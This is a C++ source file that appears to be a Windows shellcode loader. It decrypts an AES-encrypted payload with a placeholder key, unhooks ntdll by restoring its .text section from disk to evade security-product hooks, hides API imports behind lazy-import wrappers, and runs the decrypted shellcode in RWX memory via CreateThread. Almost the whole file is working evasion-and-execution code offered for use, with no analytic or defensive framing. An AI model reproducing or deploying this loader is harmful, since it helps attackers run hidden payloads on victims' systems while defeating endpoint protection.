// ------------------------------------------------------------
// PLACEHOLDER KEY: fill in your own 32-byte AES-256 key here; it
// must match the key used by your encryption tool. This repository
// does NOT distribute any real key.
// ------------------------------------------------------------
static const unsigned char AES_KEY[32] = {
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};
static const int AES_KEY_LEN = 32;
static const int AES_IV_LEN = 16;

// ============================================================
// AES-256-CBC decryption (Windows BCrypt API)
// Payload format: [16-byte IV] + [ciphertext]
// Returns 1 on success; *output and *output_len receive the decryption result (caller frees)
// ============================================================
static int aes_decrypt_payload(
    const unsigned char* payload, int payload_len,
    unsigned char** output, int* output_len)
{
    BCRYPT_ALG_HANDLE  hAlg = NULL;
    BCRYPT_KEY_HANDLE  hKey = NULL;
    unsigned char* key_obj = NULL;
    unsigned char* iv_tmp = NULL;
    unsigned char* result = NULL;
    DWORD              key_obj_len = 0, block_len = 0;
    DWORD              data_len = 0, result_len = 0;
    NTSTATUS           status;
    int                ok = 0;

    *output = NULL;
    *output_len = 0;

    if (payload_len <= AES_IV_LEN) {
        std::cerr << "[-] Payload too short: " << payload_len << " bytes\n";
        return 0;
    }

    const unsigned char* iv = payload;
    const unsigned char* ciphertext = payload + AES_IV_LEN;
    int                  ct_len = payload_len - AES_IV_LEN;

    // 1. Open the AES provider, set CBC mode, generate the key, and decrypt
    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!NT_SUCCESS(status)) goto cleanup;

    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
        (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!NT_SUCCESS(status)) goto cleanup;

    status = BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH,
        (PUCHAR)&key_obj_len, sizeof(DWORD), &data_len, 0);
    if (!NT_SUCCESS(status)) goto cleanup;

    status = BCryptGetProperty(hAlg, BCRYPT_BLOCK_LENGTH,
        (PUCHAR)&block_len, sizeof(DWORD), &data_len, 0);
    if (!NT_SUCCESS(status)) goto cleanup;

    key_obj = (unsigned char*)malloc(key_obj_len);
    iv_tmp = (unsigned char*)malloc(AES_IV_LEN);
    if (!key_obj || !iv_tmp) goto cleanup;

    status = BCryptGenerateSymmetricKey(hAlg, &hKey,
        key_obj, key_obj_len, (PUCHAR)AES_KEY, AES_KEY_LEN, 0);
    if (!NT_SUCCESS(status)) goto cleanup;

    // Query the output size
    memcpy(iv_tmp, iv, AES_IV_LEN);
    status = BCryptDecrypt(hKey, (PUCHAR)ciphertext, ct_len,
        NULL, iv_tmp, AES_IV_LEN, NULL, 0, &result_len, BCRYPT_BLOCK_PADDING);
    if (!NT_SUCCESS(status)) goto cleanup;

    // Allocate and decrypt
    result = (unsigned char*)malloc(result_len);
    if (!result) goto cleanup;

    memcpy(iv_tmp, iv, AES_IV_LEN);
    status = BCryptDecrypt(hKey, (PUCHAR)ciphertext, ct_len,
        NULL, iv_tmp, AES_IV_LEN, result, result_len, &data_len, BCRYPT_BLOCK_PADDING);
    if (!NT_SUCCESS(status)) goto cleanup;

    *output = result;
    *output_len = (int)data_len;
    result = NULL;
    ok = 1;

cleanup:
    if (!ok && result) free(result);
    if (hKey) BCryptDestroyKey(hKey);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    free(key_obj);
    free(iv_tmp);
    return ok;
}

// ============================================================
// Main function
// ============================================================
int main() {
    // ---- 3.1 AES-256-CBC decrypt the shellcode ----
    unsigned char* shellcode = NULL;
    int            shellcode_len = 0;
    int            payload_len = sizeof(shellcode_aes_payload);

    if (payload_len == 0) {
        std::cerr << "[-] shellcode_aes_payload is empty!\n";
        return -1;
    }

    if (!aes_decrypt_payload(shellcode_aes_payload, payload_len,
        &shellcode, &shellcode_len)) {
        std::cerr << "[-] AES decryption failed!\n";
        return -1;
    }

    std::cout << "[+] AES decryption done: " << shellcode_len
        << " bytes (payload was " << payload_len << " bytes)\n";

    // Debug output (optional)
    // for (int i = 0; i < shellcode_len; i++) {
    //     printf("\\x%02x", shellcode[i]);
    // }
    // printf("\n");

    // ---- 3.2 ntdll unhooking (reload the .text section from disk) ----
    HANDLE process = LI_FN(GetCurrentProcess)();
    MODULEINFO mi = {};
    HMODULE ntdllModule = LI_FN(GetModuleHandleA)("ntdll.dll");
    if (!LI_FN(GetModuleInformation)(process, ntdllModule, &mi, sizeof(mi))) {
        std::cerr << "[-] GetModuleInformation failed\n";
        free(shellcode);
        return -1;
    }

    LPVOID ntdllBase = mi.lpBaseOfDll;
    HANDLE ntdllFile = LI_FN(CreateFileA)("C:\\Windows\\System32\\ntdll.dll",
        GENERIC_READ, FILE_SHARE_READ,
        nullptr, OPEN_EXISTING, 0, nullptr);
    if (ntdllFile == INVALID_HANDLE_VALUE) {
        std::cerr << "[-] Cannot open ntdll.dll\n";
        free(shellcode);
        return -1;
    }

    HANDLE ntdllMapping = LI_FN(CreateFileMappingA)(ntdllFile, nullptr,
        PAGE_READONLY | SEC_IMAGE,
        0, 0, nullptr);
    if (!ntdllMapping) {
        std::cerr << "[-] CreateFileMapping failed\n";
        LI_FN(CloseHandle)(ntdllFile);
        free(shellcode);
        return -1;
    }

    LPVOID ntdllMappingAddress = LI_FN(MapViewOfFile)(ntdllMapping, FILE_MAP_READ,
        0, 0, 0);
    if (!ntdllMappingAddress) {
        std::cerr << "[-] MapViewOfFile failed\n";
        LI_FN(CloseHandle)(ntdllMapping);
        LI_FN(CloseHandle)(ntdllFile);
        free(shellcode);
        return -1;
    }

    // Parse the PE header
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + dosHeader->e_lfanew);

    bool textRestored = false;
    for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER section = (PIMAGE_SECTION_HEADER)(
            (DWORD_PTR)IMAGE_FIRST_SECTION(ntHeaders) +
            ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

        if (strcmp((char*)section->Name, ".text") == 0) {
            DWORD oldProtect;
            LPVOID dest = (LPVOID)((DWORD_PTR)ntdllBase + section->VirtualAddress);
            LPVOID src = (LPVOID)((DWORD_PTR)ntdllMappingAddress + section->VirtualAddress);
            // Use SizeOfRawData to avoid the issue where VirtualSize may exceed the raw file size
            SIZE_T size = section->SizeOfRawData;

            if (LI_FN(VirtualProtect)(dest, size, PAGE_EXECUTE_READWRITE, &oldProtect)) {
                memcpy(dest, src, size);
                LI_FN(VirtualProtect)(dest, size, oldProtect, &oldProtect);
                textRestored = true;
            }
            else {
                std::cerr << "[-] VirtualProtect for .text failed\n";
            }
            break;
        }
    }

    // ---- 3.3 Clean up the ntdll mapping ----
    LI_FN(UnmapViewOfFile)(ntdllMappingAddress);
    LI_FN(CloseHandle)(ntdllMapping);
    LI_FN(CloseHandle)(ntdllFile);

    if (!textRestored) {
        std::cerr << "[-] .text section not restored\n";
        free(shellcode);
        return -1;
    }
    std::cout << "[+] ntdll unhooked successfully\n";

    // ---- 3.4 Execute the shellcode ----
    LPVOID exec = LI_FN(VirtualAlloc)(nullptr, shellcode_len,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);
    if (!exec) {
        std::cerr << "[-] VirtualAlloc failed\n";
        free(shellcode);
        return -1;
    }

    memcpy(exec, shellcode, shellcode_len);
    free(shellcode);   // free the heap buffer (already copied to executable memory)

    HANDLE th = LI_FN(CreateThread)(nullptr, 0,
        (LPTHREAD_START_ROUTINE)exec,
        nullptr, 0, nullptr);
    if (!th) {
        std::cerr << "[-] CreateThread failed\n";
        LI_FN(VirtualFree)(exec, 0, MEM_RELEASE);
        return -1;
    }
    std::cout << "[+] Shellcode thread created successfully\n";

    LI_FN(WaitForSingleObject)(th, INFINITE);
    LI_FN(CloseHandle)(th);
    LI_FN(VirtualFree)(exec, 0, MEM_RELEASE);

    return 0;
}
